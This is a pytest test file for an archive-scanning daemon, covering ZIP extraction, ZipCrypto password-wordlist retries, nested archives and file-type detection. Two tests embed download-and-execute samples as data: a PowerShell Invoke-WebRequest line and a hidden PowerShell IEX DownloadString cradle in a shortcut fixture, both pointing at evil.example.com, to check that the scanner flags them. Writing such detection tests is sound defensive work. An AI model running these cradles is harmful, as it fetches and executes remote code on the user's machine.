# SPDX-License-Identifier: EUPL-1.2
# SPDX-FileCopyrightText: 2026 Carsten Rosenberg <c.rosenberg@heinlein-support.de>

"""analyze_archive unit tests, including SFlock2 and fixture-based cases."""

import binascii
import hashlib
import io
import os
import struct
import sys
import time
import zipfile
from unittest.mock import MagicMock

import aiohttp
import pytest

import xspct_scan.daemon as xspct
from tests.conftest import (
    ARCHIVE_MIXED_FILE,
    EML_FILE,
    PDF_CLEAN,
    _keywords,
    _make_lnk,
)

requires_sflock = pytest.mark.skipif(
    not xspct.HAS_SFLOCK,
    reason="SFlock2 not installed",
)


class TestAnalyzeArchive:
    def test_non_archive_bytes_returns_none(self, daemon):
        result = daemon.analyze_archive("s", "random.bin", b"\x00\x01\x02\x03" * 32, 0)
        assert result is None

    def test_depth_exceeded_returns_none(self, daemon):
        # max depth is 2 by default; depth=2 should be rejected
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("hello.txt", "hello world")
        saved = xspct.config["xspct_archive_max_depth"]
        xspct.config["xspct_archive_max_depth"] = 1
        try:
            result = daemon.analyze_archive("s", "test.zip", buf.getvalue(), depth=1)
        finally:
            xspct.config["xspct_archive_max_depth"] = saved
        assert result is None

    def test_empty_zip_returns_none(self, daemon):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w"):
            pass
        result = daemon.analyze_archive("s", "empty.zip", buf.getvalue(), 0)
        assert result is None

    @requires_sflock
    def test_zip_with_text_file_extracted(self, daemon):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("readme.txt", "hello world content")
        result = daemon.analyze_archive("s", "test.zip", buf.getvalue(), 0)
        # txt is 'text' type — analyze_text runs via sync_analyze
        assert result is not None
        names = [f["name"] for f in result["archive_files"]]
        assert "readme.txt" in names

    @requires_sflock
    def test_zip_with_pdf_extracted(self, daemon):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("doc.pdf", PDF_CLEAN)
        result = daemon.analyze_archive("s", "test.zip", buf.getvalue(), 0)
        assert result is not None
        names = [f["name"] for f in result["archive_files"]]
        assert "doc.pdf" in names

    @requires_sflock
    def test_zip_script_member_runs_script_analyzer(self, daemon):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr(
                "loader.ps1",
                "invoke-webrequest http://evil.example.com/payload.exe",
            )
        result = daemon.analyze_archive("s", "test.zip", buf.getvalue(), 0)
        assert result is not None
        assert "download-cradle" in _keywords(result["analyses"])
        member = next(
            item for item in result["archive_files"] if item["name"] == "loader.ps1"
        )
        assert member["detected_type"] == "script"
        assert "script" in member["analyzers_run"]

    @requires_sflock
    def test_zip_lnk_member_runs_lnk_analyzer(self, daemon):
        lnk_data = _make_lnk(
            target="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            arguments=(
                "-nop -w hidden -c IEX (New-Object Net.WebClient)."
                "DownloadString('http://evil.example.com/a.ps1')"
            ),
        )
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("invoice.lnk", lnk_data)
        result = daemon.analyze_archive("s", "test.zip", buf.getvalue(), 0)
        assert result is not None
        member = next(
            item for item in result["archive_files"] if item["name"] == "invoice.lnk"
        )
        assert member["detected_type"] == "lnk"
        assert "lnk" in member["analyzers_run"]
        assert "download-cradle" in _keywords(result["analyses"])

    @requires_sflock
    def test_zip_lnk_member_missing_parser_uses_raw_fallback(self, daemon, monkeypatch):
        monkeypatch.setitem(xspct.config["xspct_analyzers"]["lnk"], "enabled", True)
        monkeypatch.setattr(xspct, "HAS_LNKPARSE", False)
        monkeypatch.setattr(
            daemon, "extract_text_preview", MagicMock(return_value="raw fallback")
        )
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr(
                "invoice.lnk",
                _make_lnk(target="C:\\Windows\\System32\\cmd.exe"),
            )

        result = daemon.analyze_archive("s", "test.zip", buf.getvalue(), 0)

        member = next(
            item for item in result["archive_files"] if item["name"] == "invoice.lnk"
        )
        assert "lnk" in member["analyzers_run"]
        assert any(
            segment["source"] == "lnk" and segment["text"] == "raw fallback"
            for segment in result["text_segments"]
        )

    def test_size_limit_stops_extraction(self, daemon):
        buf = io.BytesIO()
        big_content = b"A" * 1000
        with zipfile.ZipFile(buf, "w") as z:
            for i in range(10):
                z.writestr(f"file{i}.txt", big_content)
        saved = xspct.config["xspct_archive_max_size"]
        xspct.config["xspct_archive_max_size"] = 2500  # stop early
        try:
            result = daemon.analyze_archive("s", "big.zip", buf.getvalue(), 0)
        finally:
            xspct.config["xspct_archive_max_size"] = saved
        # Some files extracted, but not all 10
        if result:
            assert len(result["archive_files"]) < 10

    def test_disabled_analyzer_returns_none(self, daemon):
        saved = xspct.config["xspct_analyzers"]["archive"]["enabled"]
        xspct.config["xspct_analyzers"]["archive"]["enabled"] = False
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("f.txt", "hi")
        try:
            result = daemon.analyze_archive("s", "test.zip", buf.getvalue(), 0)
        finally:
            xspct.config["xspct_analyzers"]["archive"]["enabled"] = saved
        assert result is None

    @requires_sflock
    def test_archive_report_has_yara_matches_key(self, daemon):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("f.txt", "some text")
        result = daemon.analyze_archive("s", "test.zip", buf.getvalue(), 0)
        assert result is not None
        # yara_matches key must always be present (YARA may have no rules loaded)
        assert "yara_matches" in result

    @requires_sflock
    def test_archive_report_has_iocs_extended_key(self, daemon):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("f.txt", "some text")
        result = daemon.analyze_archive("s", "test.zip", buf.getvalue(), 0)
        assert result is not None
        assert "iocs_extended" in result

    @requires_sflock
    def test_archive_text_member_gets_text_preview(self, daemon):
        content = b"Hello from inside the archive"
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("note.txt", content)
        result = daemon.analyze_archive("s", "test.zip", buf.getvalue(), 0)
        assert result is not None
        # text member now goes through sync_analyze which populates text_preview
        assert result.get("text_preview") or result["archive_files"]

    @requires_sflock
    def test_archive_pdf_member_propagates_yara_matches(self, daemon):
        # Even without YARA rules loaded the key must exist (empty list)
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("doc.pdf", PDF_CLEAN)
        result = daemon.analyze_archive("s", "test.zip", buf.getvalue(), 0)
        assert result is not None
        assert isinstance(result.get("yara_matches", []), list)


class TestArchiveCapabilityGating:
    def test_archive_analyzer_disabled_without_backend(self, daemon, monkeypatch):
        saved_fallback = xspct.config["xspct_archive_stdlib_fallback"]
        saved_enabled = xspct.config["xspct_analyzers"]["archive"]["enabled"]
        monkeypatch.setattr(xspct, "HAS_SFLOCK", False)
        xspct.config["xspct_archive_stdlib_fallback"] = False
        xspct.config["xspct_analyzers"]["archive"]["enabled"] = True
        try:
            enabled = daemon._resolve_enabled_analyzers()
        finally:
            xspct.config["xspct_archive_stdlib_fallback"] = saved_fallback
            xspct.config["xspct_analyzers"]["archive"]["enabled"] = saved_enabled
        assert "archive" not in enabled

    def test_archive_analyzer_enabled_with_stdlib_fallback(self, daemon, monkeypatch):
        saved_fallback = xspct.config["xspct_archive_stdlib_fallback"]
        saved_enabled = xspct.config["xspct_analyzers"]["archive"]["enabled"]
        monkeypatch.setattr(xspct, "HAS_SFLOCK", False)
        xspct.config["xspct_archive_stdlib_fallback"] = True
        xspct.config["xspct_analyzers"]["archive"]["enabled"] = True
        try:
            enabled = daemon._resolve_enabled_analyzers()
        finally:
            xspct.config["xspct_archive_stdlib_fallback"] = saved_fallback
            xspct.config["xspct_analyzers"]["archive"]["enabled"] = saved_enabled
        assert "archive" in enabled

    def test_sync_analyze_zip_without_backend_returns_unknown(
        self, daemon, monkeypatch
    ):
        saved_fallback = xspct.config["xspct_archive_stdlib_fallback"]
        saved_enabled = xspct.config["xspct_analyzers"]["archive"]["enabled"]
        monkeypatch.setattr(xspct, "HAS_SFLOCK", False)
        xspct.config["xspct_archive_stdlib_fallback"] = False
        xspct.config["xspct_analyzers"]["archive"]["enabled"] = True

        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("readme.txt", "hello world")

        try:
            report = daemon.sync_analyze(
                "s", "test.zip", buf.getvalue(), "application/zip"
            )
        finally:
            xspct.config["xspct_archive_stdlib_fallback"] = saved_fallback
            xspct.config["xspct_analyzers"]["archive"]["enabled"] = saved_enabled

        assert report["detected_type"] == "unknown"
        assert report["archive_files"] == []


# ===========================================================================
# UNIT TESTS — stdlib zipfile fallback (xspct_archive_stdlib_fallback)
# ===========================================================================


_ZIPCRYPTO_TABLE = []
for _i in range(256):
    _c = _i
    for _ in range(8):
        _c = (_c >> 1) ^ 0xEDB88320 if _c & 1 else _c >> 1
    _ZIPCRYPTO_TABLE.append(_c)


def _make_zipcrypto_zip(
    name: str,
    payload: bytes,
    password: str,
    *,
    header_prefix: bytes | None = None,
) -> bytes:
    """Build a single-member ZIP encrypted with legacy ZipCrypto.

    ``zipfile`` can *read* ZipCrypto with ``pwd=`` but cannot write it, and the
    stdlib fallback's password-retry loop is only reachable with an encrypted
    member — so the container is assembled by hand. The cipher is the one from
    APPNOTE.TXT section 6.1: three rotating keys seeded from the password, a
    12-byte random header whose last byte must equal the high byte of the
    member CRC, then a keystream XOR over the payload.
    """
    keys = [305419896, 591751049, 878082192]

    def _crc32(ch: int, crc: int) -> int:
        # Raw table step — not binascii.crc32, which pre/post-inverts.
        return (crc >> 8) ^ _ZIPCRYPTO_TABLE[(crc ^ ch) & 0xFF]

    def _update_keys(byte: int) -> None:
        keys[0] = _crc32(byte, keys[0])
        keys[1] = (keys[1] + (keys[0] & 0xFF)) & 0xFFFFFFFF
        keys[1] = (keys[1] * 134775813 + 1) & 0xFFFFFFFF
        keys[2] = _crc32((keys[1] >> 24) & 0xFF, keys[2])

    for ch in password.encode():
        _update_keys(ch)

    def _encrypt(plain: bytes) -> bytes:
        out = bytearray()
        for byte in plain:
            temp = keys[2] | 2
            out.append(byte ^ (((temp * (temp ^ 1)) >> 8) & 0xFF))
            _update_keys(byte)
        return bytes(out)

    crc = binascii.crc32(payload) & 0xFFFFFFFF
    if header_prefix is not None and len(header_prefix) != 11:
        raise ValueError("ZipCrypto header_prefix must be exactly 11 bytes")
    header = bytearray(header_prefix if header_prefix is not None else os.urandom(11))
    header.append((crc >> 24) & 0xFF)
    encrypted = _encrypt(bytes(header)) + _encrypt(payload)

    raw_name = name.encode()
    now = time.localtime()
    dos_time = (now.tm_hour << 11) | (now.tm_min << 5) | (now.tm_sec // 2)
    dos_date = ((now.tm_year - 1980) << 9) | (now.tm_mon << 5) | now.tm_mday
    flags = 0x0001  # bit 0: encrypted

    local = (
        struct.pack(
            "<IHHHHHIIIHH",
            0x04034B50,
            20,
            flags,
            0,  # stored, no compression
            dos_time,
            dos_date,
            crc,
            len(encrypted),
            len(payload),
            len(raw_name),
            0,
        )
        + raw_name
    )
    central = (
        struct.pack(
            "<IHHHHHHIIIHHHHHII",
            0x02014B50,
            20,
            20,
            flags,
            0,
            dos_time,
            dos_date,
            crc,
            len(encrypted),
            len(payload),
            len(raw_name),
            0,
            0,
            0,
            0,
            0,
            0,  # local header offset
        )
        + raw_name
    )
    body = local + encrypted
    end = struct.pack("<IHHHHIIH", 0x06054B50, 0, 0, 1, 1, len(central), len(body), 0)
    return body + central + end


def _zip_bytes(members: "dict[str, bytes]") -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for name, payload in members.items():
            z.writestr(name, payload)
    return buf.getvalue()


def _corrupt_crc_zip(name: str, payload: bytes) -> bytes:
    """Build an unencrypted ZIP whose member CRC is wrong.

    ``zipfile`` raises BadZipFile only after fully decompressing and checksumming
    the member, which is what makes a retry loop over this expensive.
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(name, payload)
    raw = bytearray(buf.getvalue())
    for signature, crc_offset in ((b"PK\x03\x04", 14), (b"PK\x01\x02", 16)):
        pos = raw.find(signature)
        raw[pos + crc_offset : pos + crc_offset + 4] = b"\xde\xad\xbe\xef"
    return bytes(raw)


def _zip_read_raises_bad_zipfile(
    archive: zipfile.ZipFile, name: str, password: str
) -> bool:
    try:
        archive.read(name, pwd=password.encode())
    except zipfile.BadZipFile:
        return True
    except RuntimeError:
        return False
    return False


class TestArchiveStdlibFallback:
    """Extraction via stdlib zipfile when SFlock2 is unavailable.

    ``xspct_archive_stdlib_fallback`` is off by default and the branch is dead
    whenever SFlock2 is installed, so every test here patches ``HAS_SFLOCK``
    off — that makes them run identically with and without the real library.
    """

    @pytest.fixture(autouse=True)
    def _fallback_only(self, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_SFLOCK", False)
        monkeypatch.setitem(xspct.config, "xspct_archive_stdlib_fallback", True)
        monkeypatch.setitem(xspct.config["xspct_analyzers"]["archive"], "enabled", True)

    def test_zip_members_extracted(self, daemon):
        payload = b"hello world"
        data = _zip_bytes({"readme.txt": payload, "doc.pdf": PDF_CLEAN})
        result = daemon.analyze_archive("s", "test.zip", data, 0)
        assert result is not None
        by_name = {f["name"]: f for f in result["archive_files"]}
        assert set(by_name) == {"readme.txt", "doc.pdf"}
        assert by_name["readme.txt"]["size"] == len(payload)
        assert by_name["readme.txt"]["sha256"] == hashlib.sha256(payload).hexdigest()

    def test_members_are_analysed_not_just_listed(self, daemon):
        data = _zip_bytes({"note.txt": b"visit http://evil.example.com/payload now"})
        result = daemon.analyze_archive("s", "test.zip", data, 0)
        assert result is not None
        entry = result["archive_files"][0]
        assert entry["detected_type"] == "text"
        assert entry["analyzers_run"]
        assert "http://evil.example.com/payload" in result["iocs"]["urls"]

    def test_directory_entries_skipped(self, daemon):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("nested/", b"")
            z.writestr("nested/readme.txt", b"hello world")
        result = daemon.analyze_archive("s", "test.zip", buf.getvalue(), 0)
        assert result is not None
        assert [f["name"] for f in result["archive_files"]] == ["nested/readme.txt"]

    def test_encrypted_member_opened_with_wordlist_password(self, daemon):
        # "test123" is in the daemon fixture's password list; the loop must
        # fall through the pwd=None attempt (RuntimeError) and retry.
        payload = b"decrypted by the wordlist"
        data = _make_zipcrypto_zip("secret.txt", payload, "test123")
        result = daemon.analyze_archive("s", "enc.zip", data, 0)
        assert result is not None
        entry = result["archive_files"][0]
        assert entry["name"] == "secret.txt"
        assert entry["sha256"] == hashlib.sha256(payload).hexdigest()

    def test_crc_mismatch_from_header_collision_retries_wordlist(self, daemon):
        """A wrong password can pass ZipCrypto's one-byte header check.

        zipfile then raises BadZipFile for the payload CRC; the next candidate
        must still be tried rather than aborting the member password loop.
        """
        correct_password = "test123"
        header_prefix = b"\0" * 11
        payload = b"retry after a ZipCrypto header collision"
        data = _make_zipcrypto_zip(
            "secret.txt",
            payload,
            correct_password,
            header_prefix=header_prefix,
        )

        with zipfile.ZipFile(io.BytesIO(data)) as zf:
            collision_password = next(
                candidate
                for number in range(10000)
                if _zip_read_raises_bad_zipfile(
                    zf, "secret.txt", candidate := f"wrong-{number}"
                )
            )
            with pytest.raises(zipfile.BadZipFile):
                zf.read("secret.txt", pwd=collision_password.encode())

        daemon.passwords = [collision_password, correct_password]
        result = daemon.analyze_archive("s", "enc.zip", data, 0)
        assert result is not None
        assert (
            result["archive_files"][0]["sha256"] == hashlib.sha256(payload).hexdigest()
        )

    def test_corrupt_plain_member_is_not_retried(self, daemon, monkeypatch):
        """A plain member failing CRC is corrupt, not password-protected.

        Retrying the wordlist would repeat the same full decompress + CRC pass
        for every candidate, and the archive size cap cannot stop it because
        total_extracted only advances on a successful extraction.
        """
        reads: list = []
        original_read = zipfile.ZipFile.read

        def _counting_read(self, name, pwd=None):
            reads.append(pwd)
            return original_read(self, name, pwd=pwd)

        monkeypatch.setattr(zipfile.ZipFile, "read", _counting_read)
        daemon.passwords = [f"pw{i}" for i in range(50)]

        data = _corrupt_crc_zip("broken.bin", b"A" * 4096)
        assert daemon.analyze_archive("s", "corrupt.zip", data, 0) is None
        assert reads == [None]

    def test_encrypted_member_with_unknown_password_yields_nothing(self, daemon):
        data = _make_zipcrypto_zip("secret.txt", b"never opened", "not-in-wordlist")
        assert daemon.analyze_archive("s", "enc.zip", data, 0) is None

    def test_non_archive_bytes_return_none(self, daemon):
        assert (
            daemon.analyze_archive("s", "random.bin", b"\x00\x01\x02" * 64, 0) is None
        )

    def test_size_limit_stops_extraction(self, daemon, monkeypatch):
        monkeypatch.setitem(xspct.config, "xspct_archive_max_size", 4)
        data = _zip_bytes({"big.txt": b"A" * 1024})
        assert daemon.analyze_archive("s", "test.zip", data, 0) is None

    def test_7z_without_py7zr_returns_none(self, daemon, monkeypatch):
        # None in sys.modules makes `import py7zr` raise ImportError, which is
        # the branch taken on a bare install.
        monkeypatch.setitem(sys.modules, "py7zr", None)
        data = b"7z\xbc\xaf\x27\x1c" + b"\x00" * 64
        assert daemon.analyze_archive("s", "test.7z", data, 0) is None

    def test_fallback_not_used_when_disabled(self, daemon, monkeypatch):
        monkeypatch.setitem(xspct.config, "xspct_archive_stdlib_fallback", False)
        data = _zip_bytes({"readme.txt": b"hello world"})
        assert daemon.analyze_archive("s", "test.zip", data, 0) is None


# ===========================================================================
# UNIT TESTS — sflock2 archive extraction path
# ===========================================================================


class _SflockFile:
    """Minimal stub mimicking sflock2's File object."""

    def __init__(
        self, filename="", contents=b"", children=None, error=None, password=None
    ):
        self.filename = filename
        self.contents = contents
        self.children = children or []
        self.error = error
        self.password = password


class TestAnalyzeArchiveSflock:
    """Tests for the sflock2-backed extraction path in analyze_archive."""

    def _make_sflock_result(self, members: list):
        """Build a fake sflock File tree from a list of (name, bytes) tuples."""
        children = [_SflockFile(filename=name, contents=data) for name, data in members]
        return _SflockFile(filename="archive.zip", children=children)

    def test_sflock_path_extracts_text_member(self, daemon, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_SFLOCK", True)
        fake_result = self._make_sflock_result([("readme.txt", b"hello from sflock")])
        monkeypatch.setattr(
            xspct,
            "_sflock",
            type("M", (), {"unpack": staticmethod(lambda **kw: fake_result)})(),
        )
        result = daemon.analyze_archive("s", "archive.zip", b"FAKEARCHIVEBYTES", 0)
        assert result is not None
        names = [f["name"] for f in result["archive_files"]]
        assert "readme.txt" in names

    def test_sflock_path_extracts_pdf_member(self, daemon, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_SFLOCK", True)
        fake_result = self._make_sflock_result([("doc.pdf", PDF_CLEAN)])
        monkeypatch.setattr(
            xspct,
            "_sflock",
            type("M", (), {"unpack": staticmethod(lambda **kw: fake_result)})(),
        )
        result = daemon.analyze_archive("s", "test.zip", b"FAKEARCHIVEBYTES", 0)
        assert result is not None
        assert any(f["name"] == "doc.pdf" for f in result["archive_files"])

    def test_sflock_empty_children_returns_none(self, daemon, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_SFLOCK", True)
        fake_result = _SflockFile(filename="bad.zip", children=[])
        monkeypatch.setattr(
            xspct,
            "_sflock",
            type("M", (), {"unpack": staticmethod(lambda **kw: fake_result)})(),
        )
        result = daemon.analyze_archive("s", "bad.zip", b"FAKEARCHIVEBYTES", 0)
        assert result is None

    def test_sflock_password_retry_stops_on_success(self, daemon, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_SFLOCK", True)
        calls = []

        def _unpack(**kw):
            calls.append(kw.get("password"))
            if kw.get("password") == "secret":
                return self._make_sflock_result([("protected.txt", b"unlocked")])
            return _SflockFile(
                filename="enc.zip", children=[], error="Decryption failed"
            )

        daemon.passwords = ["wrong", "secret", "notneeded"]
        monkeypatch.setattr(
            xspct, "_sflock", type("M", (), {"unpack": staticmethod(_unpack)})()
        )
        result = daemon.analyze_archive("s", "enc.zip", b"FAKEARCHIVEBYTES", 0)
        assert result is not None
        assert "secret" in calls
        assert "notneeded" not in calls  # stopped after success

    def test_sflock_size_limit_precheck_returns_none(self, daemon, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_SFLOCK", True)
        saved = xspct.config["xspct_archive_max_size"]
        xspct.config["xspct_archive_max_size"] = 10  # tiny limit
        try:
            result = daemon.analyze_archive("s", "huge.zip", b"X" * 100, 0)
        finally:
            xspct.config["xspct_archive_max_size"] = saved
        assert result is None

    def test_sflock_nested_container_walked(self, daemon, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_SFLOCK", True)
        # Simulate a ZIP-inside-ZIP already unpacked by sflock
        inner_leaf = _SflockFile(filename="inner.txt", contents=b"nested content")
        outer_child = _SflockFile(filename="inner.zip", children=[inner_leaf])
        root = _SflockFile(filename="outer.zip", children=[outer_child])
        monkeypatch.setattr(
            xspct,
            "_sflock",
            type("M", (), {"unpack": staticmethod(lambda **kw: root)})(),
        )
        result = daemon.analyze_archive("s", "outer.zip", b"FAKEARCHIVEBYTES", 0)
        assert result is not None
        names = [f["name"] for f in result["archive_files"]]
        assert "inner.txt" in names

    def test_sflock_decryption_password_stored_in_report(self, daemon, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_SFLOCK", True)
        fake_result = self._make_sflock_result([("secret.txt", b"payload")])
        fake_result.password = "infected"
        monkeypatch.setattr(
            xspct,
            "_sflock",
            type("M", (), {"unpack": staticmethod(lambda **kw: fake_result)})(),
        )
        result = daemon.analyze_archive("s", "enc.zip", b"FAKEARCHIVEBYTES", 0)
        assert result is not None
        assert result.get("decryption_password") == "infected"
        assert result.get("decrypted") is True

    def test_sflock_exception_falls_back_gracefully(self, daemon, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_SFLOCK", True)

        def _boom(**kw):
            raise RuntimeError("sflock internal error")

        monkeypatch.setattr(
            xspct, "_sflock", type("M", (), {"unpack": staticmethod(_boom)})()
        )
        # Should return None (not raise)
        result = daemon.analyze_archive("s", "corrupt.zip", b"FAKEARCHIVEBYTES", 0)
        assert result is None


class TestGetDetectedTypeSflockFormats:
    """Ensure new archive formats are recognised after sflock support was added."""

    def test_rar_by_extension(self, daemon):
        assert daemon.get_detected_type(None, None, "archive.rar", None) == "archive"

    def test_eml_by_extension(self, daemon):
        assert daemon.get_detected_type(None, None, "email.eml", None) == "archive"

    def test_msg_mime_returns_archive(self, daemon):
        assert (
            daemon.get_detected_type("application/vnd.ms-outlook", None, None, None)
            == "archive"
        )

    def test_eml_mime_returns_archive(self, daemon):
        assert daemon.get_detected_type("message/rfc822", None, None, None) == "archive"

    def test_cab_by_extension(self, daemon):
        assert daemon.get_detected_type(None, None, "setup.cab", None) == "archive"

    def test_ace_by_extension(self, daemon):
        assert daemon.get_detected_type(None, None, "archive.ace", None) == "archive"

    def test_iso_by_extension(self, daemon):
        assert daemon.get_detected_type(None, None, "disc.iso", None) == "archive"

    def test_tar_gz_by_extension_tgz(self, daemon):
        assert daemon.get_detected_type(None, None, "pkg.tgz", None) == "archive"

    def test_tar_bz2_by_extension_tbz2(self, daemon):
        assert daemon.get_detected_type(None, None, "src.tbz2", None) == "archive"

    def test_rar_desc_returns_archive(self, daemon):
        assert (
            daemon.get_detected_type(None, "rar archive data", None, None) == "archive"
        )

    def test_vhd_by_extension(self, daemon):
        assert daemon.get_detected_type(None, None, "disk.vhd", None) == "archive"

    def test_vhdx_by_extension(self, daemon):
        assert daemon.get_detected_type(None, None, "disk.vhdx", None) == "archive"

    def test_vhd_by_magic_desc(self, daemon):
        assert (
            daemon.get_detected_type(
                None, "Microsoft Disk Image, Virtual Server", None, None
            )
            == "archive"
        )

    def test_vhdx_by_magic_desc(self, daemon):
        assert (
            daemon.get_detected_type(None, "Microsoft Disk Image Extended", None, None)
            == "archive"
        )


# ===========================================================================
# UNIT TESTS — PartialReport
# ===========================================================================


@pytest.mark.skipif(
    not xspct.HAS_SFLOCK or not os.path.exists(ARCHIVE_MIXED_FILE),
    reason="SFlock2 or archive_mixed.zip not available",
)
class TestArchiveMixedFixture:
    """Tests using the generated archive_mixed.zip fixture."""

    @pytest.fixture(autouse=True)
    def _data(self):
        self.data = open(ARCHIVE_MIXED_FILE, "rb").read()

    def test_archive_files_extracted(self, daemon):
        r = daemon.analyze_archive("s", "archive_mixed.zip", self.data)
        assert r is not None
        assert len(r["archive_files"]) >= 3

    def test_readme_txt_in_archive_files(self, daemon):
        r = daemon.analyze_archive("s", "archive_mixed.zip", self.data)
        names = [f["name"] for f in r["archive_files"]]
        assert "readme.txt" in names

    def test_nested_pdf_in_archive_files(self, daemon):
        r = daemon.analyze_archive("s", "archive_mixed.zip", self.data)
        names = [f["name"] for f in r["archive_files"]]
        assert any(n.endswith(".pdf") for n in names)

    def test_ioc_extracted_from_text_member(self, daemon):
        r = daemon.analyze_archive("s", "archive_mixed.zip", self.data)
        all_urls = " ".join(r["iocs"]["urls"])
        assert "ioc-from-archive.example.com" in all_urls

    def test_report_has_required_keys(self, daemon):
        r = daemon.analyze_archive("s", "archive_mixed.zip", self.data)
        assert r is not None
        for key in (
            "archive_files",
            "analyses",
            "iocs",
            "yara_matches",
            "iocs_extended",
        ):
            assert key in r

    def test_detected_as_archive_type(self, daemon):
        t = daemon.get_detected_type("application/zip", None, "archive_mixed.zip", None)
        assert t == "archive"

    @pytest.mark.asyncio
    async def test_scan_endpoint_archive(self, client):
        data = open(ARCHIVE_MIXED_FILE, "rb").read()
        form = aiohttp.FormData()
        form.add_field(
            "doc", data, filename="archive_mixed.zip", content_type="application/zip"
        )
        resp = await client.post("/v1/scan", data=form)
        assert resp.status == 200
        body = await resp.json()
        assert body["file"]["type"] == "archive"
        assert isinstance(
            body.get("engines", {}).get("archive", {}).get("files", []), list
        )
        assert len(body.get("engines", {}).get("archive", {}).get("files", [])) >= 1


# ===========================================================================
# FIXTURE-FILE TESTS — EML e-mail with attachment
# ===========================================================================


@pytest.mark.skipif(
    not os.path.exists(EML_FILE),
    reason="email_with_attachment.eml not present — run tests/create_fixtures.py",
)
class TestEmlFixture:
    """Tests using the generated email_with_attachment.eml fixture."""

    @pytest.fixture(autouse=True)
    def _data(self):
        self.data = open(EML_FILE, "rb").read()

    def test_eml_detected_as_archive(self, daemon):
        # EML routes to 'archive' so sflock2 can extract attachments
        t = daemon.get_detected_type("message/rfc822", None, "test.eml", None)
        assert t == "archive"

    def test_eml_extension_detected_as_archive(self, daemon):
        t = daemon.get_detected_type(None, None, "email_with_attachment.eml", None)
        assert t == "archive"

    def test_msg_extension_detected_as_archive(self, daemon):
        t = daemon.get_detected_type(None, None, "outlook_item.msg", None)
        assert t == "archive"

    def test_eml_bytes_are_non_empty(self):
        # Sanity: fixture file was created successfully
        assert len(self.data) > 100

    @pytest.mark.skipif(not xspct.HAS_SFLOCK, reason="sflock2 not installed")
    def test_sflock_extracts_eml_attachment(self, daemon):
        """Integration test: sflock2 extracts the attachment from the EML."""
        r = daemon.analyze_archive("s", "email_with_attachment.eml", self.data)
        assert r is not None
        names = [f["name"] for f in r["archive_files"]]
        assert any("invoice" in n.lower() or "pdf" in n.lower() for n in names)


# ===========================================================================
# FIXTURE-FILE TESTS — QR code image
# ===========================================================================
